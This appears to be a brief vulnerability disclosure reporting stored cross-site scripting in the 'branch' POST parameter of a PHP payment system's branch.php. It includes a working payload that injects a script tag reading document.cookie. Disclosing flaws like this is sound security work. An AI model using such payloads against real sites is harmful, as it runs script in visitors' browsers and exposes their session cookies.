BUG_Author: zhangyf

Vulnerability File: /paysystem/branch.php

POST parameter "branch" exists stored cross-site scripting vulnerability

Payload: branch=<script>alert(document.cookie)</script>&address=1&detail=2&id=&action=add&save=

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/1.png)

Payload will trigger when a user visits on http://localhost/paysystem/branch.php

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/2.png)



